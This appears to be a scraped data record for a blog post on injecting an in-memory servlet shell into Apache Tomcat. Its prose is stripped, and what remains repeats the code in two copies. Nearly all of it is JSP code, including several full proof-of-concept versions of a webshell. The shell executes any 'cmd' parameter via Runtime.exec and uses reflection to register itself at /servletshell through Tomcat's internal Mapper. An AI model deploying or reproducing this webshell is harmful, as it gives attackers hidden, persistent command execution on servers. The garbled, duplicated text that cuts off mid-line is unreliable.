`ApplicationFilterChain#`\\`internalDoFilter `` servlet `` service\\` \n\n\n\n `DefaultServlet`  `ServletShell` servletservlet `setServlet` \n\n\n\n`ApplicationFilterFactor#createFilterChain`\n\n\n\n`StandardWrapperValv#invoke`\n\n\n\nservlet `wrapper.allocate` \n\n\n\n `instance`  `instance`  `wrapper` \n\n\n\n `getContainer`\n\n\n\n `setContainer` `StandardContextValve#invoke`\n\n\n\nwrapper `wrapper` `request` `request` `org.apache.catalina.connector.CoyoteAdapter#service`\n\n\n\n `request` `postParseRequest` \n\n\n\n\n\nmap\n\n\n\n`org.apache.catalina.mappe.Mapper#internalMap` `contextVersion`\n\n\n\n `contextVersion` `exactWrappers` servlet `wrapper` servlet404servletwrapperwrapper `addWrapper` \n\n\n\n `contextVersion`  `wrapper`\n\n   `contextVersion`\n\n\n\n\n\n `contextObjectToContextVersionMap`\n\n\n\n `contextVersion`  `contextVersion`,`contextObjectToContextVersionMap` mappermapper\n\n\n\nservice `getMapper`  `mapper`  `StandardService` \n\n\n\n `ApplicationContext`  `service`  `ApplicationContext` \n\n```auto\n//service\n    Field servicef=applicationContext.getClass().getDeclaredField(\"service\");\n    servicef.setAccessible(true);\n    StandardService service=(StandardService) servicef.get(applicationContext);\n\n    //mapper\n    Mapper mapper=service.getMapper();\n\n    //contextVersion\n    Field contextObjectToContextVersionMapf=mapper.getClass().getDeclaredField(\"contextObjectToContextVersionMap\");\n    contextObjectToContextVersionMapf.setAccessible(true);\n    ConcurrentHashMap contextObjectToContextVersionMap=(ConcurrentHashMap) contextObjectToContextVersionMapf.get(mapper);\n    Object contextVersion=contextObjectToContextVersionMap.get(standardContext);\n\n    //addWrapper\n    Class[] classes=mapper.getClass().getDeclaredClasses();\n    Class classt=classes[1];\n    Method addWrapper=mapper.getClass().getDeclaredMethod(\"addWrapper\", classt, String.class, Wrapper.class, boolean.class, boolean.class);\n    addWrapper.setAccessible(true);\n    addWrapper.invoke(mapper,contextVersion,\"/servletshell\",shellWrapper,false,false);\n    System.out.println(\"ook\");\n```\n\n   `wrapper`\n\n `StandardContext` `createWrapper`  `wrapper`\n\n\n\n```auto\n//wrapper\n    StandardWrapper shellWrapper=(StandardWrapper) standardContext.createWrapper();\n    shellWrapper.setServlet(shell);\n    shellWrapper.setServletClass(shell.getClass().getName());\n```\n\n\n\n```auto\n<%@ page import=\"java.io.ByteArrayOutputStream\" %>\n<%@ page import=\"java.io.IOException\" %>\n<%@ page import=\"java.io.InputStream\" %>\n<%@ page import=\"java.io.Writer\" %>\n<%@ page import=\"java.lang.reflect.Field\" %>\n<%@ page import=\"org.apache.catalina.core.ApplicationContext\" %>\n<%@ page import=\"org.apache.catalina.core.StandardContext\" %>\n<%@ page import=\"java.lang.reflect.Method\" %>\n<%@ page import=\"org.apache.catalina.core.StandardWrapper\" %>\n<%@ page import=\"org.apache.catalina.core.StandardService\" %>\n<%@ page import=\"org.apache.catalina.mapper.Mapper\" %>\n<%@ page import=\"org.apache.catalina.Wrapper\" %>\n<%@ page import=\"java.util.concurrent.ConcurrentHashMap\" %>\n<%@ page contentType=\"text/html;charset=UTF-8\" language=\"java\" %>\n\n<%\n    class Servletshell extends HttpServlet {\n        @Override\n        protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {\n            String cmd=req.getParameter(\"cmd\");\n            if(cmd!=null){\n                InputStream in = Runtime.getRuntime().exec(\"cmd /c \"+cmd).getInputStream();\n\n                ByteArrayOutputStream baos = new ByteArrayOutputStream();\n                byte[] b = new byte[1024];\n                int a = -1;\n\n                while ((a = in.read(b)) != -1) {\n                    baos.write(b, 0, a);\n                }\n                Writer writer=resp.getWriter();\n                writer.write(new String(baos.toByteArray()));\n                writer.flush();\n            }\n        }\n\n        @Override\n        protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {\n            super.doPost(req, resp);\n        }\n    }\n%>\n\n<%\n    //context\n    ServletContext servletContext = request.getSession().getServletContext();\n\n    Field appctx = servletContext.getClass().getDeclaredField(\"context\");\n    appctx.setAccessible(true);\n    ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);\n\n    Field stdctx = applicationContext.getClass().getDeclaredField(\"context\");\n    stdctx.setAccessible(true);\n    StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);\n\n    //\n    Field state=Class.forName(\"org.apache.catalina.util.LifecycleBase\").getDeclaredField(\"state\");\n    state.setAccessible(true);\n    state.set(standardContext,org.apache.catalina.LifecycleState.STARTING_PREP);\n\n    //\n    String servletName=\"ServletShell\";\n    String urlpattern=\"/servletshell\";\n    Class serletC=Servletshell.class;\n\n    Method addServlet=Class.forName(\"org.apache.catalina.core.ApplicationContext\").getDeclaredMethod(\"addServlet\", String.class, Class.class);\n    addServlet.invoke(applicationContext,servletName,serletC);\n\n    Method addServletMapping=Class.forName(\"org.apache.catalina.core.StandardContext\").getDeclaredMethod(\"addServletMapping\", String.class, String.class);\n    addServletMapping.invoke(standardContext,urlpattern,servletName);\n\n    Servletshell shell=new Servletshell();\n    //wrapper\n    StandardWrapper shellWrapper=(StandardWrapper) standardContext.createWrapper();\n    shellWrapper.setServlet(shell);\n    shellWrapper.setServletClass(shell.getClass().getName());\n    //shellWrapper.addMapping(\"/servletshell\");\n\n    //service\n    Field servicef=applicationContext.getClass().getDeclaredField(\"service\");\n    servicef.setAccessible(true);\n    StandardService service=(StandardService) servicef.get(applicationContext);\n\n    //mapper\n    Mapper mapper=service.getMapper();\n\n    //contextVersion\n    Field contextObjectToContextVersionMapf=mapper.getClass().getDeclaredField(\"contextObjectToContextVersionMap\");\n    contextObjectToContextVersionMapf.setAccessible(true);\n    ConcurrentHashMap contextObjectToContextVersionMap=(ConcurrentHashMap) contextObjectToContextVersionMapf.get(mapper);\n    Object contextVersion=contextObjectToContextVersionMap.get(standardContext);\n\n    //addWrapper\n    Class[] classes=mapper.getClass().getDeclaredClasses();\n    Class classt=classes[1];\n    Method addWrapper=mapper.getClass().getDeclaredMethod(\"addWrapper\", classt, String.class, Wrapper.class, boolean.class, boolean.class);\n    addWrapper.setAccessible(true);\n    addWrapper.invoke(mapper,contextVersion,\"/servletshell\",shellWrapper,false,false);\n    System.out.println(\"ook\");\n\n    if(state!=null){\n        state.set(standardContext,org.apache.catalina.LifecycleState.STARTED);\n    }\n%>\n```\n\n\n\n500wrapper\n\nwrapperwrapper `parent` \n\n```auto\nshellWrapper.setParent(standardContext);\n```\n\npoc\n\n```auto\n<%@ page import=\"java.io.ByteArrayOutputStream\" %>\n<%@ page import=\"java.io.IOException\" %>\n<%@ page import=\"java.io.InputStream\" %>\n<%@ page import=\"java.io.Writer\" %>\n<%@ page import=\"java.lang.reflect.Field\" %>\n<%@ page import=\"org.apache.catalina.core.ApplicationContext\" %>\n<%@ page import=\"org.apache.catalina.core.StandardContext\" %>\n<%@ page import=\"java.lang.reflect.Method\" %>\n<%@ page import=\"org.apache.catalina.core.StandardWrapper\" %>\n<%@ page import=\"org.apache.catalina.core.StandardService\" %>\n<%@ page import=\"org.apache.catalina.mapper.Mapper\" %>\n<%@ page import=\"org.apache.catalina.Wrapper\" %>\n<%@ page import=\"java.util.concurrent.ConcurrentHashMap\" %>\n<%@ page contentType=\"text/html;charset=UTF-8\" language=\"java\" %>\n\n<%\n    class Servletshell extends HttpServlet {\n        @Override\n        protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {\n            String cmd=req.getParameter(\"cmd\");\n            if(cmd!=null){\n                InputStream in = Runtime.getRuntime().exec(\"cmd /c \"+cmd).getInputStream();\n\n                ByteArrayOutputStream baos = new ByteArrayOutputStream();\n                byte[] b = new byte[1024];\n                int a = -1;\n\n                while ((a = in.read(b)) != -1) {\n                    baos.write(b, 0, a);\n                }\n                Writer writer=resp.getWriter();\n                writer.write(new String(baos.toByteArray()));\n                writer.flush();\n            }\n        }\n\n        @Override\n        protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {\n            super.doPost(req, resp);\n        }\n    }\n%>\n\n<%\n    //context\n    ServletContext servletContext = request.getSession().getServletContext();\n\n    Field appctx = servletContext.getClass().getDeclaredField(\"context\");\n    appctx.setAccessible(true);\n    ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);\n\n    Field stdctx = applicationContext.getClass().getDeclaredField(\"context\");\n    stdctx.setAccessible(true);\n    StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);\n\n    //\n    Field state=Class.forName(\"org.apache.catalina.util.LifecycleBase\").getDeclaredField(\"state\");\n    state.setAccessible(true);\n    state.set(standardContext,org.apache.catalina.LifecycleState.STARTING_PREP);\n\n    //\n    String servletName=\"ServletShell\";\n    String urlpattern=\"/servletshell\";\n    Class serletC=Servletshell.class;\n\n    Method addServlet=Class.forName(\"org.apache.catalina.core.ApplicationContext\").getDeclaredMethod(\"addServlet\", String.class, Class.class);\n    addServlet.invoke(applicationContext,servletName,serletC);\n\n    Method addServletMapping=Class.forName(\"org.apache.catalina.core.StandardContext\").getDeclaredMethod(\"addServletMapping\", String.class, String.class);\n    addServletMapping.invoke(standardContext,urlpattern,servletName);\n\n    Servletshell shell=new Servletshell();\n    //wrapper\n    StandardWrapper shellWrapper=(StandardWrapper) standardContext.createWrapper();\n    shellWrapper.setServlet(shell);\n    shellWrapper.setServletClass(shell.getClass().getName());\n    shellWrapper.setParent(standardContext);\n    //shellWrapper.addMapping(\"/servletshell\");\n\n    //service\n    Field servicef=applicationContext.getClass().getDeclaredField(\"service\");\n    servicef.setAccessible(true);\n    StandardService service=(StandardService) servicef.get(applicationContext);\n\n    //mapper\n    Mapper mapper=service.getMapper();\n\n    //contextVersion\n    Field contextObjectToContextVersionMapf=mapper.getClass().getDeclaredField(\"contextObjectToContextVersionMap\");\n    contextObjectToContextVersionMapf.setAccessible(true);\n    ConcurrentHashMap contextObjectToContextVersionMap=(ConcurrentHashMap) contextObjectToContextVersionMapf.get(mapper);\n    Object contextVersion=contextObjectToContextVersionMap.get(standardContext);\n\n    //addWrapper\n    Class[] classes=mapper.getClass().getDeclaredClasses();\n    Class classt=classes[1];\n    Method addWrapper=mapper.getClass().getDeclaredMethod(\"addWrapper\", classt, String.class, Wrapper.class, boolean.class, boolean.class);\n    addWrapper.setAccessible(true);\n    addWrapper.invoke(mapper,contextVersion,\"/servletshell\",shellWrapper,false,false);\n    System.out.println(\"ook\");\n\n    if(state!=null){\n        state.set(standardContext,org.apache.catalina.LifecycleState.STARTED);\n    }\n%>\n```\n\n\n\n\n\n addservletpoc\n\n```auto\n<%@ page import=\"java.io.ByteArrayOutputStream\" %>\n<%@ page import=\"java.io.IOException\" %>\n<%@ page import=\"java.io.InputStream\" %>\n<%@ page import=\"java.io.Writer\" %>\n<%@ page import=\"java.lang.reflect.Field\" %>\n<%@ page import=\"org.apache.catalina.core.ApplicationContext\" %>\n<%@ page import=\"org.apache.catalina.core.StandardContext\" %>\n<%@ page import=\"java.lang.reflect.Method\" %>\n<%@ page import=\"org.apache.catalina.core.StandardWrapper\" %>\n<%@ page import=\"org.apache.catalina.core.StandardService\" %>\n<%@ page import=\"org.apache.catalina.mapper.Mapper\" %>\n<%@ page import=\"org.apache.catalina.Wrapper\" %>\n<%@ page import=\"java.util.concurrent.ConcurrentHashMap\" %>\n<%@ page contentType=\"text/html;charset=UTF-8\" language=\"java\" %>\n\n<%\n    class Servletshell extends HttpServlet {\n        @Override\n        protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {\n            String cmd=req.getParameter(\"cmd\");\n            if(cmd!=null){\n                InputStream in = Runtime.getRuntime().exec(\"cmd /c \"+cmd).getInputStream();\n\n                ByteArrayOutputStream baos = new ByteArrayOutputStream();\n                byte[] b = new byte[1024];\n                int a = -1;\n\n                while ((a = in.read(b)) != -1) {\n                    baos.write(b, 0, a);\n                }\n                Writer writer=resp.getWriter();\n                writer.write(new String(baos.toByteArray()));\n                writer.flush();\n            }\n        }\n\n        @Override\n        protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {\n            super.doPost(req, resp);\n        }\n    }\n%>\n\n<%\n    //context\n    ServletContext servletContext = request.getSession().getServletContext();\n\n    Field appctx = servletContext.getClass().getDeclaredField(\"context\");\n    appctx.setAccessible(true);\n    ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);\n\n    Field stdctx = applicationContext.getClass().getDeclaredField(\"context\");\n    stdctx.setAccessible(true);\n    StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);\n\n      //wrapper\n    Servletshell shell=new Servletshell()\n    StandardWrapper shellWrapper=(StandardWrapper) standardContext.createWrapper();\n    shellWrapper.setServlet(shell);\n    shellWrapper.setServletClass(shell.getClass().getName());\n    shellWrapper.setParent(standardContext);\n\n    //service\n    Field servicef=applicationContext.getClass().getDeclaredField(\"service\");\n    servicef.setAccessible(true);\n    StandardService service=(StandardService) servicef.get(applicationContext);\n\n    //mapper\n    Mapper mapper=service.getMapper();\n\n    //contextVersion\n    Field contextObjectToContextVersionMapf=mapper.getClass().getDeclaredField(\"contextObjectToContextVersionMap\");\n    contextObjectToContextVersionMapf.setAccessible(true);\n    ConcurrentHashMap contextObjectToContextVersionMap=(ConcurrentHashMap) contextObjectToContextVersionMapf.get(mapper);\n    Object contextVersion=contextObjectToContextVersionMap.get(standardContext);\n\n    //addWrapper\n    Class[] classes=mapper.getClass().getDeclaredClasses();\n    Class classt=classes[1];\n    Method addWrapper=mapper.getClass().getDeclaredMethod(\"addWrapper\", classt, String.class, Wrapper.class, boolean.class, boolean.class);\n    addWrapper.setAccessible(true);\n    addWrapper.invoke(mapper,contextVersion,\"/servletshell\",shellWrapper,false,false);\n%>\n```\n\n\n\n## \n\nservlet\n\n","source":"_posts/Tomcatservlet.md","raw":"---\ntitle: Tomcatservlet\ndate: 2023-06-09 23:11:27\nexcerpt: Tomcatservlet\ncategories: \n---\n\n\n\n## \n\n\n\n## \n\nservletservletservlet\n\n\n\n\n\n\n\n`DefaultInstanceManager#newInstance`  `clazz` \n\n\n\n `clazz`  `StandardWrapper.servletClass` `StandardWrapperValve`  `context`  `StandardContext`  `children` \n\n\n\nwrapperservletservlet `StandardContext`  `addServlet` \n\n\n\n`ApplicationContext` \n\n\n\n `createWrapper`  `servlet`  `addChild`  `children` servletdemo\n\n```php\n<%@ page import=\"java.io.ByteArrayOutputStream\" %>\n<%@ page import=\"java.io.IOException\" %>\n<%@ page import=\"java.io.InputStream\" %>\n<%@ page import=\"java.io.Writer\" %>\n<%@ page import=\"java.lang.reflect.Field\" %>\n<%@ page import=\"org.apache.catalina.core.ApplicationContext\" %>\n<%@ page import=\"org.apache.catalina.core.StandardContext\" %>\n<%@ page import=\"java.lang.reflect.Method\" %>\n<%@ page contentType=\"text/html;charset=UTF-8\" language=\"java\" %>\n\n<%\n    class Servletshell extends HttpServlet {\n        @Override\n        protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {\n            String cmd=req.getParameter(\"cmd\");\n            if(cmd!=null){\n                InputStream in = Runtime.getRuntime().exec(\"cmd /c \"+cmd).getInputStream();\n\n                ByteArrayOutputStream baos = new ByteArrayOutputStream();\n                byte[] b = new byte[1024];\n                int a = -1;\n\n                while ((a = in.read(b)) != -1) {\n                    baos.write(b, 0, a);\n                }\n                Writer writer=resp.getWriter();\n                writer.write(new String(baos.toByteArray()));\n                writer.flush();\n            }\n        }\n\n        @Override\n        protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {\n            super.doPost(req, resp);\n        }\n    }\n%>\n\n<%\n    //context\n    ServletContext servletContext = request.getSession().getServletContext();\n\n    Field appctx = servletContext.getClass().getDeclaredField(\"context\");\n    appctx.setAccessible(true);\n    ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);\n\n    Field stdctx = applicationContext.getClass().getDeclaredField(\"context\");\n    stdctx.setAccessible(true);\n    StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);\n\n    //\n    Field state=Class.forName(\"org.apache.catalina.util.LifecycleBase\").getDeclaredField(\"state\");\n    state.setAccessible(true);\n    state.set(standardContext,org.apache.catalina.LifecycleState.STARTING_PREP);\n\n    //\n    String servletName=\"servletShell\";\n    String servletClass=\"servletShell.class\";\n    Class serletC=Servletshell.class;\n    Method addServlet=Class.forName(\"org.apache.catalina.core.ApplicationContext\").getDeclaredMethod(\"addServlet\", String.class, Class.class);\n    //addServlet.setAccessible(true);\n    addServlet.invoke(applicationContext,servletName,serletC);\n    System.out.println(standardContext.findChildren());\n%>\n```\n\n\n\nservlet `children` \n\n\n\n `servlet-name`\n\n\n\n `addServletMapping` \n\n```auto\n<%@ page import=\"java.io.ByteArrayOutputStream\" %>\n<%@ page import=\"java.io.IOException\" %>\n<%@ page import=\"java.io.InputStream\" %>\n<%@ page import=\"java.io.Writer\" %>\n<%@ page import=\"java.lang.reflect.Field\" %>\n<%@ page import=\"org.apache.catalina.core.ApplicationContext\" %>\n<%@ page import=\"org.apache.catalina.core.StandardContext\" %>\n<%@ page import=\"java.lang.reflect.Method\" %>\n<%@ page contentType=\"text/html;charset=UTF-8\" language=\"java\" %>\n\n<%\n    class Servletshell extends HttpServlet {\n        @Override\n        protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {\n            String cmd=req.getParameter(\"cmd\");\n            if(cmd!=null){\n                InputStream in = Runtime.getRuntime().exec(\"cmd /c \"+cmd).getInputStream();\n\n                ByteArrayOutputStream baos = new ByteArrayOutputStream();\n                byte[] b = new byte[1024];\n                int a = -1;\n\n                while ((a = in.read(b)) != -1) {\n                    baos.write(b, 0, a);\n                }\n                Writer writer=resp.getWriter();\n                writer.write(new String(baos.toByteArray()));\n                writer.flush();\n            }\n        }\n\n        @Override\n        protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {\n            super.doPost(req, resp);\n        }\n    }\n%>\n\n<%\n    //context\n    ServletContext servletContext = request.getSession().getServletContext();\n\n    Field appctx = servletContext.getClass().getDeclaredField(\"context\");\n    appctx.setAccessible(true);\n    ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);\n\n    Field stdctx = applicationContext.getClass().getDeclaredField(\"context\");\n    stdctx.setAccessible(true);\n    StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);\n\n    //\n    Field state=Class.forName(\"org.apache.catalina.util.LifecycleBase\").getDeclaredField(\"state\");\n    state.setAccessible(true);\n    state.set(standardContext,org.apache.catalina.LifecycleState.STARTING_PREP);\n\n    //\n    String servletName=\"servletShell\";\n    String urlpattern=\"/servletshell\";\n    Class serletC=Servletshell.class;\n\n    Method addServlet=Class.forName(\"org.apache.catalina.core.ApplicationContext\").getDeclaredMethod(\"addServlet\", String.class, Class.class);\n    addServlet.invoke(applicationContext,servletName,serletC);\n\n    Method addServletMapping=Class.forName(\"org.apache.catalina.core.StandardContext\").getDeclaredMethod(\"addServletMapping\", String.class, String.class);\n    addServletMapping.invoke(standardContext,urlpattern,servletName);\n\n    System.out.println(standardContext.findChildren());\n%>\n```\n\n\n\n503503\n\nsb\n\n```auto\nif(state!=null){\n        state.set(standardContext,org.apache.catalina.LifecycleState.STARTED);\n    }\n```\n\n404\n\n\n\n `ApplicationFilterChain#`\\`internalDoFilter `` servlet `` service\\` \n\n\n\n `DefaultServlet`  `ServletShell` servletservlet `setServlet` \n\n\n\n`ApplicationFilterFactor#createFilterChain`\n\n\n\n`StandardWrapperValv#invoke`\n\n\n\nservlet `wrapper.allocate` \n\n\n\n `instance`  `instance`  `wrapper` \n\n\n\n `getContainer`\n\n\n\n `setContainer` `StandardContextValve#invoke`\n\n\n\nwrapper `wrapper` `request` `request` `org.apache.catalina.connector.CoyoteAdapter#service`\n\n\n\n `request` `postParseRequest` \n\n\n\n\n\nmap\n\n\n\n`org.apache.catalina.mappe.Mapper#internalMap` `contextVersion`\n\n\n\n `contextVersion` `exactWrappers` servlet `wrapper` servlet404servletwrapperwrapper `addWrapper` \n\n\n\n `contextVersion`  `wrapper`\n\n   `contextVersion`\n\n\n\n\n\n `contextObjectToContextVersionMap`\n\n\n\n `contextVersion`  `contextVersion`,`contextObjectToContextVersionMap` mappermapper\n\n\n\nservice `getMapper`  `mapper`  `StandardService` \n\n\n\n `ApplicationContext`  `service`  `ApplicationContext` \n\n```auto\n//service\n    Field servicef=applicationContext.getClass().getDeclaredField(\"service\");\n    servicef.setAccessible(true);\n    StandardService service=(StandardService) servicef.get(applicationContext);\n\n    //mapper\n    Mapper mapper=service.getMapper();\n\n    //contextVersion\n    Field contextObjectToContextVersionMapf=mapper.getClass().getDeclaredField(\"contextObjectToContextVersionMap\");\n    contextObjectToContextVersionMapf.setAccessible(true);\n    ConcurrentHashMap contextObjectToContextVersionMap=(ConcurrentHashMap) contextObjectToContextVersionMapf.get(mapper);\n    Object contextVersion=contextObjectToContextVersionMap.get(standardContext);\n\n    //addWrapper\n    Class[] classes=mapper.getClass().getDeclaredClasses();\n    Class classt=classes[1];\n    Method addWrapper=mapper.getClass().getDeclaredMethod(\"addWrapper\", classt, String.class, Wrapper.class, boolean.class, boolean.class);\n    addWrapper.setAccessible(true);\n    addWrapper.invoke(mapper,contextVersion,\"/servletshell\",shellWrapper,false,false);\n    System.out.println(\"ook\");\n```\n\n   `wrapper`\n\n `StandardContext` `createWrapper`  `wrapper`\n\n\n\n```auto\n//wrapper\n    StandardWrapper shellWrapper=(StandardWrapper) standardContext.createWrapper();\n    shellWrapper.setServlet(shell);\n    shellWrapper.setServletClass(shell.getClass().getName());\n```\n\n\n\n```auto\n<%@ page import=\"java.io.ByteArrayOutputStream\" %>\n<%@ page import=\"java.io.IOException\" %>\n<%@ page import=\"java.io.InputStream\" %>\n<%@ page import=\"java.io.Writer\" %>\n<%@ page import=\"java.lang.reflect.Field\" %>\n<%@ page import=\"org.apache.catalina.core.ApplicationContext\" %>\n<%@ page import=\"org.apache.catalina.core.StandardContext\" %>\n<%@ page import=\"java.lang.reflect.Method\" %>\n<%@ page import=\"org.apache.catalina.core.StandardWrapper\" %>\n<%@ page import=\"org.apache.catalina.core.StandardService\" %>\n<%@ page import=\"org.apache.catalina.mapper.Mapper\" %>\n<%@ page import=\"org.apache.catalina.Wrapper\" %>\n<%@ page import=\"java.util.concurrent.ConcurrentHashMap\" %>\n<%@ page contentType=\"text/html;charset=UTF-8\" language=\"java\" %>\n\n<%\n    class Servletshell extends HttpServlet {\n        @Override\n        protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {\n            String cmd=req.getParameter(\"cmd\");\n            if(cmd!=null){\n                InputStream in = Runtime.getRuntime().exec(\"cmd /c \"+cmd).getInputStream();\n\n                ByteArrayOutputStream baos = new ByteArrayOutputStream();\n                byte[] b = new byte[1024];\n                int a = -1;\n\n                while ((a = in.read(b)) != -1) {\n                    baos.write(b, 0, a);\n                }\n                Writer writer=resp.getWriter();\n                writer.write(new String(baos.toByteArray()));\n                writer.flush();\n            }\n        }\n\n        @Override\n        protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {\n            super.doPost(req, resp);\n        }\n    }\n%>\n\n<%\n    //context\n    ServletContext servletContext = request.getSession().getServletContext();\n\n    Field appctx = servletContext.getClass().getDeclaredField(\"context\");\n    appctx.setAccessible(true);\n    ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);\n\n    Field stdctx = applicationContext.getClass().getDeclaredField(\"context\");\n    stdctx.setAccessible(true);\n    StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);\n\n    //\n    Field state=Class.forName(\"org.apache.catalina.util.LifecycleBase\").getDeclaredField(\"state\");\n    state.setAccessible(true);\n    state.set(standardContext,org.apache.catalina.LifecycleState.STARTING_PREP);\n\n    //\n    String servletName=\"ServletShell\";\n    String urlpattern=\"/servletshell\";\n    Class serletC=Servletshell.class;\n\n    Method addServlet=Class.forName(\"org.apache.catalina.core.ApplicationContext\").getDeclaredMethod(\"addServlet\", String.class, Class.class);\n    addServlet.invoke(applicationContext,servletName,serletC);\n\n    Method addServletMapping=Class.forName(\"org.apache.catalina.core.StandardContext\").getDeclaredMethod(\"addServletMapping\", String.class, String.class);\n    addServletMapping.invoke(standardContext,urlpattern,servletName);\n\n    Servletshell shell=new Servletshell();\n    //wrapper\n    StandardWrapper shellWrapper=(StandardWrapper) standardContext.createWrapper();\n    shellWrapper.setServlet(shell);\n    shellWrapper.setServletClass(shell.getClass().getName());\n    //shellWrapper.addMapping(\"/servletshell\");\n\n    //service\n    Field servicef=applicationContext.getClass().getDeclaredField(\"service\");\n    servicef.setAccessible(true);\n    StandardService service=(StandardService) servicef.get(applicationContext);\n\n    //mapper\n    Mapper mapper=service.getMapper();\n\n    //contextVersion\n    Field contextObjectToContextVersionMapf=mapper.getClass().getDeclaredField(\"contextObjectToContextVersionMap\");\n    contextObjectToContextVersionMapf.setAccessible(true);\n    ConcurrentHashMap contextObjectToContextVersionMap=(ConcurrentHashMap) contextObjectToContextVersionMapf.get(mapper);\n    Object contextVersion=contextObjectToContextVersionMap.get(standardContext);\n\n    //addWrapper\n    Class[] classes=mapper.getClass().getDeclaredClasses();\n    Class classt=classes[1];\n    Method addWrapper=mapper.getClass().getDeclaredMethod(\"addWrapper\", classt, String.class, Wrapper.class, boolean.class, boolean.class);\n    addWrapper.setAccessible(true);\n    addWrapper.invoke(mapper,contextVersion,\"/servletshell\",shellWrapper,false,false);\n    System.out.println(\"ook\");\n\n    if(state!=null){\n        state.set(standardContext,org.apache.catalina.LifecycleState.STARTED);\n    }\n%>\n```\n\n\n\n500wrapper\n\nwrapperwrapper `parent` \n\n```auto\nshellWrapper.setParent(standardContext);\n```\n\npoc\n\n```auto\n<%@ page import=\"java.io.ByteArrayOutputStream\" %>\n<%@ page import=\"java.io.IOException\" %>\n<%@ page import=\"java.io.InputStream\" %>\n<%@ page import=\"java.io.Writer\" %>\n<%@ page import=\"java.lang.reflect.Field\" %>\n<%@ page import=\"org.apache.catalina.core.ApplicationContext\" %>\n<%@ page import=\"org.apache.catalina.core.StandardContext\" %>\n<%@ page import=\"java.lang.reflect.Method\" %>\n<%@ page import=\"org.apache.catalina.core.StandardWrapper\" %>\n<%@ page import=\"org.apache.catalina.core.StandardService\" %>\n<%@ page import=\"org.apache.catalina.mapper.Mapper\" %>\n<%@ page import=\"org.apache.catalina.Wrapper\" %>\n<%@ page import=\"java.util.concurrent.ConcurrentHashMap\" %>\n<%@ page contentType=\"text/html;charset=UTF-8\" language=\"java\" %>\n\n<%\n    class Servletshell extends HttpServlet {\n        @Override\n        protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {\n            String cmd=req.getParameter(\"cmd\");\n            if(cmd!=null){\n                InputStream in = Runtime.getRuntime().exec(\"cmd /c \"+cmd).getInputStream();\n\n                ByteArrayOutputStream baos = new ByteArrayOutputStream();\n                byte[] b = new byte[1024];\n                int a = -1;\n\n                while ((a = in.read(b)) != -1) {\n                    baos.write(b, 0, a);\n                }\n                Writer writer=resp.getWriter();\n                writer.write(new String(baos.toByteArray()));\n                writer.flush();\n            }\n        }\n\n        @Override\n        protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {\n            super.doPost(req, resp);\n        }\n    }\n%>\n\n<%\n    //context\n    ServletContext servletContext = request.getSession().getServletContext();\n\n    Field appctx = servletContext.getClass().getDeclaredField(\"context\");\n    appctx.setAccessible(true);\n    ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);\n\n    Field stdctx = applicationContext.getClass().getDeclaredField(\"context\");\n    stdctx.setAccessible(true);\n    StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);\n\n    //\n    Field state=Class.forName(\"org.apache.catalina.util.LifecycleBase\").getDeclaredField(\"state\");\n    state.setAccessible(true);\n    state.set(standardContext,org.apache.catalina.LifecycleState.STARTING_PREP);\n\n    //\n    String servletName=\"ServletShell\";\n    String urlpattern=\"/servletshell\";\n    Class serletC=Servletshell.class;\n\n    Method addServlet=Class.forName(\"org.apache.catalina.core.ApplicationContext\").getDeclaredMethod(\"addServlet\", String.class, Class.class);\n    addServlet.invoke(applicationContext,servletName,serletC);\n\n    Method addServletMapping=Class.forName(\"org.apache.catalina.core.StandardContext\").getDeclaredMethod(\"addServletMapping\", String.class, String.class);\n    addServletMapping.invoke(standardContext,urlpattern,servletName);\n\n    Servletshell shell=new Servletshell();\n    //wrapper\n    StandardWrapper shellWrapper=(StandardWrapper) standardContext.createWrapper();\n    shellWrapper.setServlet(shell);\n    shellWrapper.setServletClass(shell.getClass().getName());\n    shellWrapper.setParent(standardContext);\n    //shellWrapper.addMapping(\"/servletshell\");\n\n    //service\n    Field servicef=applicationContext.getClass().getDeclaredField(\"service\");\n    servicef.setAccessible(true);\n    StandardService service=(StandardService) servicef.get(applicationContext);\n\n    //mapper\n    Mapper mapper=service.getMapper();\n\n    //contextVersion\n    Field contextObjectToContextVersionMapf=mapper.getClass().getDeclaredField(\"contextObjectToContextVersionMap\");\n    contextObjectToContextVersionMapf.setAccessible(true);\n    ConcurrentHashMap contextObjectToContextVersionMap=(ConcurrentHashMap) contextObjectToContextVersionMapf.get(mapper);\n    Object contextVersion=contextObjectToContextVersionMap.get(standardContext);\n\n    //addWrapper\n    Class[] classes=mapper.getClass().getDeclaredClasses();\n    Class classt=classes[1];\n    Method addWrapper=mapper.getClass().getDeclaredMethod(\"addWrapper\", classt, String.class, Wrapper.class, boolean.class, boolean.class);\n    addWrapper.setAccessible(true);\n    addWrapper.invoke(mapper,contextVersion,\"/servletshell\",shellWrapper,false,false);\n    System.out.println(\"ook\");\n\n    if(state!=null){\n        